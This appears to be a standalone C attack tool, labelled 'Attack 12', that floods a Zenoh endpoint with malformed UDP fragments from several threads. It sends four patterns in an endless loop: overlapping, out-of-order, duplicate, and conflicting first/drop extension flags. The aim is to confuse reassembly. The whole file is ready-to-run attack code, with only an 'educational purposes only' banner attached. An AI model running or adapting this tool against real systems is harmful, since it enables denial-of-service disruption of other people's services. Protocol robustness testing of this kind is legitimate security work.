/*
 * Attack 12: Fragmentation Reassembly Confusion
 * Sends overlapping/conflicting fragments to confuse reassembly
 * 
 * Compile: gcc -o attack12_fragconfuse attack_12_fragment_confusion.c -pthread
 * Run: ./attack12_fragconfuse <target_ip> <target_port> <threads>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

#define Z_MSG_FRAGMENT 0x01
#define Z_FLAG_MORE 0x40
#define Z_FLAG_RELIABLE 0x20
#define Z_FLAG_EXTENSIONS 0x80
#define Z_EXT_FRAGMENT_FIRST 0x01
#define Z_EXT_FRAGMENT_DROP 0x02

static volatile int g_running = 1;
static atomic_ullong g_attacks_sent = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int thread_id;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping fragment confusion attack...\n");
    g_running = 0;
}

size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

// Attack pattern 1: Overlapping fragments with different data
void attack_overlapping_fragments(int sock, struct sockaddr_in *target, 
                                  unsigned long long seq) {
    unsigned char buffer[2048];
    
    // Fragment 1: Bytes 0-512
    size_t offset = 0;
    buffer[offset++] = Z_MSG_FRAGMENT | Z_FLAG_MORE | Z_FLAG_RELIABLE;
    offset += encode_zint(buffer + offset, seq);
    memset(buffer + offset, 0xAA, 512);
    offset += 512;
    
    sendto(sock, buffer, offset, 0, (struct sockaddr*)target, sizeof(*target));
    usleep(1000);
    
    // Fragment 2: Bytes 256-768 (overlaps with fragment 1!)
    offset = 0;
    buffer[offset++] = Z_MSG_FRAGMENT | Z_FLAG_MORE | Z_FLAG_RELIABLE;
    offset += encode_zint(buffer + offset, seq);
    memset(buffer + offset, 0xBB, 512);
    offset += 512;
    
    sendto(sock, buffer, offset, 0, (struct sockaddr*)target, sizeof(*target));
}

// Attack pattern 2: Out-of-order fragments
void attack_outoforder_fragments(int sock, struct sockaddr_in *target,
                                unsigned long long seq) {
    unsigned char buffer[2048];
    
    // Send fragment 3 first
    size_t offset = 0;
    buffer[offset++] = Z_MSG_FRAGMENT | Z_FLAG_MORE | Z_FLAG_RELIABLE;
    offset += encode_zint(buffer + offset, seq + 2);
    memset(buffer + offset, 0xCC, 512);
    offset += 512;
    sendto(sock, buffer, offset, 0, (struct sockaddr*)target, sizeof(*target));
    
    usleep(500);
    
    // Then fragment 1
    offset = 0;
    buffer[offset++] = Z_MSG_FRAGMENT | Z_FLAG_MORE | Z_FLAG_RELIABLE;
    offset += encode_zint(buffer + offset, seq);
    memset(buffer + offset, 0xDD, 512);
    offset += 512;
    sendto(sock, buffer, offset, 0, (struct sockaddr*)target, sizeof(*target));
    
    usleep(500);
    
    // Then fragment 2
    offset = 0;
    buffer[offset++] = Z_MSG_FRAGMENT | Z_FLAG_MORE | Z_FLAG_RELIABLE;
    offset += encode_zint(buffer + offset, seq + 1);
    memset(buffer + offset, 0xEE, 512);
    offset += 512;
    sendto(sock, buffer, offset, 0, (struct sockaddr*)target, sizeof(*target));
}

// Attack pattern 3: Duplicate fragments
void attack_duplicate_fragments(int sock, struct sockaddr_in *target,
                               unsigned long long seq) {
    unsigned char buffer[2048];
    
    size_t offset = 0;
    buffer[offset++] = Z_MSG_FRAGMENT | Z_FLAG_MORE | Z_FLAG_RELIABLE;
    offset += encode_zint(buffer + offset, seq);
    memset(buffer + offset, 0xFF, 512);
    offset += 512;
    
    // Send same fragment 10 times
    for (int i = 0; i < 10; i++) {
        sendto(sock, buffer, offset, 0, (struct sockaddr*)target, sizeof(*target));
        usleep(100);
    }
}

// Attack pattern 4: Conflicting "first" and "drop" flags
void attack_conflicting_flags(int sock, struct sockaddr_in *target,
                             unsigned long long seq) {
    unsigned char buffer[2048];
    
    // Fragment marked as FIRST
    size_t offset = 0;
    buffer[offset++] = Z_MSG_FRAGMENT | Z_FLAG_MORE | Z_FLAG_RELIABLE | Z_FLAG_EXTENSIONS;
    offset += encode_zint(buffer + offset, seq);
    
    // Add extension: FIRST flag
    buffer[offset++] = Z_EXT_FRAGMENT_FIRST;
    buffer[offset++] = 0x00; // No payload in extension
    
    memset(buffer + offset, 0x11, 512);
    offset += 512;
    sendto(sock, buffer, offset, 0, (struct sockaddr*)target, sizeof(*target));
    
    usleep(1000);
    
    // Same sequence but marked as DROP
    offset = 0;
    buffer[offset++] = Z_MSG_FRAGMENT | Z_FLAG_MORE | Z_FLAG_RELIABLE | Z_FLAG_EXTENSIONS;
    offset += encode_zint(buffer + offset, seq);
    
    // Add extension: DROP flag
    buffer[offset++] = Z_EXT_FRAGMENT_DROP;
    buffer[offset++] = 0x00;
    
    memset(buffer + offset, 0x22, 512);
    offset += 512;
    sendto(sock, buffer, offset, 0, (struct sockaddr*)target, sizeof(*target));
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: Socket failed\n", args->thread_id);
        free(args);
        return NULL;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    printf("[+] Thread %d started (fragment confusion attacks)\n", args->thread_id);
    
    unsigned long long seq = args->thread_id * 1000000ULL;
    unsigned long local_count = 0;
    
    while (g_running) {
        int attack_type = rand() % 4;
        
        switch (attack_type) {
            case 0:
                attack_overlapping_fragments(sock, &target_addr, seq);
                break;
            case 1:
                attack_outoforder_fragments(sock, &target_addr, seq);
                break;
            case 2:
                attack_duplicate_fragments(sock, &target_addr, seq);
                break;
            case 3:
                attack_conflicting_flags(sock, &target_addr, seq);
                break;
        }
        
        seq += 10;
        atomic_fetch_add(&g_attacks_sent, 1);
        local_count++;
        
        if (local_count % 100 == 0) {
            printf("[Thread %d] Performed %lu confusion attacks\n",
                   args->thread_id, local_count);
        }
        
        usleep(50000); // 50ms delay
    }
    
    close(sock);
    printf("[*] Thread %d stopped\n", args->thread_id);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads>\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Fragment Reassembly Confusion      ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Attack patterns:\n");
    printf("    1. Overlapping fragments\n");
    printf("    2. Out-of-order fragments\n");
    printf("    3. Duplicate fragments\n");
    printf("    4. Conflicting extension flags\n\n");
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    pthread_t threads[num_threads];
    time_t start = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
    }
    
    printf("[+] Attack started!\n\n");
    
    while (g_running) {
        sleep(5);
        unsigned long long total = atomic_load(&g_attacks_sent);
        printf("[*] Total confusion attacks: %llu\n", total);
    }
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Attacks: %-27llu ║\n", (unsigned long long)atomic_load(&g_attacks_sent));
    printf("║ Duration:      %-27ld ║\n", time(NULL) - start);
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}